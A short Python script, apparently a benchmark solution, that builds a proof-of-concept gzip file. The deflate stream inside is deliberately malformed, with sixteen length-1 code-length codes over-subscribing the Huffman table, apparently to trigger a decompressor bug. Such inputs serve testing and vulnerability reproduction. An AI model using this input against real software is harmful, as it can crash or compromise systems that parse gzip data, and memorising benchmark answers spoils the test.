import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        
        class BitWriter:
            def __init__(self):
                self._data = bytearray()
                self._current_byte = 0
                self._bit_pos = 0

            def write(self, value: int, num_bits: int):
                for i in range(num_bits):
                    bit = (value >> i) & 1
                    self._current_byte |= (bit << self._bit_pos)
                    self._bit_pos += 1
                    if self._bit_pos == 8:
                        self._data.append(self._current_byte)
                        self._current_byte = 0
                        self._bit_pos = 0

            def get_bytes(self) -> bytes:
                if self._bit_pos > 0:
                    self._data.append(self._current_byte)
                return bytes(self._data)

        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff'

        bw = BitWriter()
        
        bw.write(1, 1)
        bw.write(2, 2)

        bw.write(0, 5)
        bw.write(0, 5)
        bw.write(12, 4)

        for _ in range(16):
            bw.write(1, 3)

        deflate_stream = bw.get_bytes()

        trailer = b'\x00\x00\x00\x00\x00\x00\x00\x00'

        poc = header + deflate_stream + trailer
        return poc